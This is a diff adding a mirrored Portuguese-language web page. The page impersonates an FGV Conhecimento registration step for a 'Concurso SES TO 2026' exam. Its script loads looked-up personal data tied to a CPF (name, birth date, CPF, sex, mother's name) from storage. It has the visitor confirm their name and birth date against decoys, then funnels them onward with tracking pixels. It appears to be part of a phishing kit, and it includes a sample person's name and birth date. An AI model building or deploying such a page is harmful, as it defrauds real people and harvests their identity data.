@@ -1,0 +1,367 @@
+<!DOCTYPE html><html lang="pt-br"><!-- Mirrored from concursopm.site/inicio/validar-dados/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 Sep 2025 02:22:15 GMT --><head><meta http-equiv="content-type" content="text/html;charset=utf-8">
+    
+        <meta charset="UTF-8">
+        <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <title>Concurso SES TO 2026 - Validação de Dados</title>
+        
+
+        <script src="js/3.4.16.js"></script>
+        <link href="css/all.min.css" rel="stylesheet">
+        <link href="../css/fgv-portal.css" rel="stylesheet">
+        <link href="css/home.css" rel="stylesheet">
+        <script src="js/utm-preservation.js"></script>
+       
+        <script>
+            // Replace with your actual counter name
+            fetch("https://counterapi.com/api/hit/cnu")
+                .then((res) => res.json())
+                .then((data) => {
+                    console.log("Total visits:", data.count);
+                    // You can remove the console.log if you want no output at all
+                })
+                .catch((err) => console.error("Visit counter error:", err));
+        </script>
+
+        <style>
+.form-header { background-color: #233769;
+                color: white;
+                font-weight: 600;
+            }
+            button#submit-button {
+                transition: all 0.2s ease;
+                background-color: #0d6efd;
+                color: rgba(255, 255, 255, 0.6);
+            }
+            button#submit-button:not([disabled]) {
+                color: white;
+                cursor: pointer;
+            }
+            button#submit-button:not([disabled]):hover {
+                background-color: #4d7396;
+            }
+            .required-star {
+                color: #ff0000;
+            }
+.option-container {
+                border: 2px solid #d1d5db;
+                transition: all 0.2s ease;
+            }
+            .option-container:hover {
+                border-color: #93c5fd;
+            }
+            .option-container.selected {
+                border-color: #003f6b;
+                background-color: #f0f9ff;
+            }
+            .option-container.selected .option-selector {
+                background-color: #003f6b;
+                color: white;
+            }
+            .option-selector {
+                background-color: #e5e7eb;
+                color: #4b5563;
+            }
+            #validation-step {
+                transition: opacity 0.5s ease;
+            }
+        </style>
+        <script>
+            const fakeName1 = "MARCELO HENRIQUE SILVA SOUZA";
+            const fakeName2 = "LUCAS PEREIRA MENDES";
+
+            const fakeDate1 = "1998-03-25";
+            const fakeDate2 = "2002-08-17";
+
+            let currentStep = 1;
+            let nomeSelecionado = null;
+            let dataSelecionada = null;
+            let userData = null;
+
+            document.addEventListener("DOMContentLoaded", function () {
+                // SISTEMA DE SEGURANÇA TEMPORARIAMENTE DESATIVADO
+                const cpfDataString = localStorage.getItem("cpfData");
+
+                // Dados de teste para desenvolvimento (quando não há dados reais)
+                const testUserData = {
+                    NOME: "IRACEMA DE SOUSA SILVA",
+                    NASC: "1970-10-24 00:00:00",
+                };
+
+                if (!cpfDataString) {
+                    console.log(
+                        "⚠️ Usando dados de teste - Sistema de segurança desativado",
+                    );
+                    userData = testUserData;
+                } else {
+                    const parsedData = JSON.parse(cpfDataString);
+                    console.log("Dados recebidos:", parsedData);
+                    
+                    // Processar dados da API Apela
+                    let user = null;
+                    
+                    if (parsedData.nome && parsedData.nascimento) {
+                        // Formato da API Apela - dados diretos
+                        user = {
+                            NOME: parsedData.nome,
+                            NASC: parsedData.nascimento,
+                            CPF: parsedData.cpf,
+                            SEXO: parsedData.sexo,
+                            MAE: parsedData.mae
+                        };
+                    } else if (parsedData.DADOS) {
+                        // Formato de fallback (API antiga) - apenas para compatibilidade
+                        user = parsedData.DADOS;
+                    } else if (parsedData.dados && parsedData.dados[0]) {
+                        // Formato de fallback (dados é um array) - apenas para compatibilidade
+                        user = parsedData.dados[0];
+                    } else if (parsedData.NOME && parsedData.NASCIMENTO) {
+                        // Formato de fallback - apenas para compatibilidade
+                        user = {
+                            NOME: parsedData.NOME,
+                            NASC: parsedData.NASCIMENTO
+                        };
+                    }
+
+                    if (!user) {
+                        console.log(
+                            "⚠️ Usando dados de teste - Sistema de segurança desativado",
+                        );
+                        userData = testUserData;
+                    } else {
+                        userData = user;
+                        console.log("Dados processados:", userData);
+                    }
+                }
+                console.log("Dados carregados:", userData);
+
+                showValidationStep(1);
+                fillNameOptions();
+
+                const submitBtn = document.getElementById("submit-button");
+                submitBtn.addEventListener("click", function () {
+                    if (currentStep === 1) {
+                        if (nomeSelecionado) {
+                            if (nomeSelecionado === userData.NOME) {
+                                showValidationStep(2);
+                                fillDateOptions();
+                            } else {
+                                alert(
+                                    "Nome incorreto! Por favor tente novamente.",
+                                );
+                                resetNameSelection();
+                            }
+                        } else {
+                            alert("Selecione uma opção para prosseguir.");
+                        }
+                    } else if (currentStep === 2) {
+                        if (dataSelecionada) {
+                            if (dataSelecionada === userData.NASC) {
+                                try { if (window.FunnelTracker) FunnelTracker.advance('validar-dados'); } catch (e) {}
+                                redirectWithUtmParams("/endereco/");
+                            } else {
+                                alert(
+                                    "Data de nascimento incorreta! Por favor tente novamente.",
+                                );
+                                resetDateSelection();
+                            }
+                        } else {
+                            alert("Selecione uma opção para prosseguir.");
+                        }
+                    }
+                });
+            });
+
+            function fillNameOptions() {
+                const options = [userData.NOME, fakeName1, fakeName2];
+                shuffleArray(options);
+
+                const nameOptions = document.getElementById("name-options");
+                nameOptions.innerHTML = "";
+
+                options.forEach((name, index) => {
+                    const option = document.createElement("div");
+                    option.className =
+                        "option-container rounded-md p-4 mb-3 cursor-pointer flex items-center";
+                    option.innerHTML = `
+                <div class="option-selector flex-shrink-0 rounded-full h-6 w-6 mr-3 flex items-center justify-center text-sm font-bold">
+                    ${index + 1}
+                </div>
+                <div class="flex-grow" style="text-transform:uppercase;">${name}</div>
+            `;
+                    option.addEventListener("click", function () {
+                        selectNameOption(this, name);
+                    });
+                    nameOptions.appendChild(option);
+                });
+            }
+
+            function fillDateOptions() {
+                const options = [userData.NASC, fakeDate1, fakeDate2];
+                shuffleArray(options);
+
+                const dateOptions = document.getElementById("date-options");
+                dateOptions.innerHTML = "";
+
+                options.forEach((date, index) => {
+                    const formattedDate = formatDate(date);
+                    const option = document.createElement("div");
+                    option.className =
+                        "option-container rounded-md p-4 mb-3 cursor-pointer flex items-center";
+                    option.innerHTML = `
+                <div class="option-selector flex-shrink-0 rounded-full h-6 w-6 mr-3 flex items-center justify-center text-sm font-bold">
+                    ${index + 1}
+                </div>
+                <div class="flex-grow">${formattedDate}</div>
+            `;
+                    option.addEventListener("click", function () {
+                        selectDateOption(this, date);
+                    });
+                    dateOptions.appendChild(option);
+                });
+            }
+
+            function formatDate(dateString) {
+                if (!dateString) return "";
+                // Remove a parte da hora se existir (tanto com 'T' quanto com espaço)
+                if (dateString.includes("T")) {
+                    dateString = dateString.split("T")[0];
+                } else if (dateString.includes(" ")) {
+                    dateString = dateString.split(" ")[0];
+                }
+                const parts = dateString.split("-");
+                if (parts.length === 3) {
+                    return `${parts[2]}/${parts[1]}/${parts[0]}`;
+                }
+                return dateString;
+            }
+
+            function selectNameOption(element, name) {
+                const options = document.querySelectorAll(
+                    "#name-options .option-container",
+                );
+                options.forEach((opt) => opt.classList.remove("selected"));
+                element.classList.add("selected");
+                nomeSelecionado = name;
+                document.getElementById("submit-button").disabled = false;
+            }
+
+            function selectDateOption(element, date) {
+                const options = document.querySelectorAll(
+                    "#date-options .option-container",
+                );
+                options.forEach((opt) => opt.classList.remove("selected"));
+                element.classList.add("selected");
+                dataSelecionada = date;
+                document.getElementById("submit-button").disabled = false;
+            }
+
+            function resetNameSelection() {
+                const options = document.querySelectorAll(
+                    "#name-options .option-container",
+                );
+                options.forEach((opt) => opt.classList.remove("selected"));
+                nomeSelecionado = null;
+                document.getElementById("submit-button").disabled = true;
+            }
+
+            function resetDateSelection() {
+                const options = document.querySelectorAll(
+                    "#date-options .option-container",
+                );
+                options.forEach((opt) => opt.classList.remove("selected"));
+                dataSelecionada = null;
+                document.getElementById("submit-button").disabled = true;
+            }
+
+            function showValidationStep(step) {
+                const steps = document.querySelectorAll(".validation-step");
+                steps.forEach((s) => s.classList.add("hidden"));
+
+                document
+                    .getElementById(`step-${step}`)
+                    .classList.remove("hidden");
+                currentStep = step;
+                document.getElementById("submit-button").disabled = true;
+                document.getElementById("submit-button-text").textContent =
+                    "Prosseguir";
+            }
+
+            function shuffleArray(array) {
+                for (let i = array.length - 1; i > 0; i--) {
+                    const j = Math.floor(Math.random() * (i + 1));
+                    [array[i], array[j]] = [array[j], array[i]];
+                }
+                return array;
+            }
+        </script>
+    <!-- UTMfy Pixel -->
+    <script>
+      window.googlePixelId = "68fafce3e95a8ad5bfc8863d";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmfy.com.br/scripts/pixel/pixel-google.js");
+      document.head.appendChild(a);
+    </script>
+
+    <script
+      src="https://cdn.utmfy.com.br/scripts/utms/latest.js"
+      data-utmfy-prevent-xcod-sck
+      data-utmfy-prevent-subids
+      async
+      defer
+    ></script>
+    </head>
+    <body class="fgv-body">
+        <div class="fgv-brand fgv-brand--compact">
+            <img src="logo-fgv-conhecimento.svg" alt="FGV Conhecimento">
+        </div>
+        <main class="flex-grow py-8">
+            <div class="container mx-auto px-4 max-w-3xl">
+                <div class="border border-gray-300 rounded">
+                    <div class="form-header py-2 px-4 text-center">
+                        <h2 class="text-lg">
+                            Inscrição > Validação de Dados
+                        </h2>
+                    </div>
+                    <div class="p-4">
+                        <div class="validation-step hidden" id="step-1">
+                            <p class="mb-4">
+                                Para confirmar sua identidade, selecione seu
+                                nome completo entre as opções abaixo:
+                            </p>
+                            <div id="name-options" class="mt-6"></div>
+                        </div>
+                        <div class="validation-step hidden" id="step-2">
+                            <p class="mb-4">
+                                Agora, selecione sua data de nascimento entre as
+                                opções abaixo:
+                            </p>
+                            <div id="date-options" class="mt-6"></div>
+                        </div>
+                    </div>
+                    <div class="border-t border-gray-300">
+                        <div class="p-2 bg-gray-100 flex items-center">
+                            <a class="text-gray-700 flex items-center" href="#"><i class="fas fa-sign-out-alt mr-1"></i>
+                                Sair</a>
+                        </div>
+                        <div class="form-footer p-0 flex justify-center items-center">
+                            <button id="submit-button" class="flex items-center justify-center w-full h-full py-3" type="button" disabled="">
+                                <i class="fas fa-arrow-right mr-2"></i>
+                                <span id="submit-button-text">Prosseguir</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+        <footer class="fgv-footer">
+  <img src="logo-fgv-conhecimento.svg" alt="FGV Conhecimento">
+  <div>FGV Conhecimento</div>
+</footer>
+    
+
+
+
+<script src="/js/funnel-tracker.js" data-funnel-step="validar-dados"></script>
+</body><!-- Mirrored from concursopm.site/inicio/validar-dados/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 Sep 2025 02:22:16 GMT --></html>
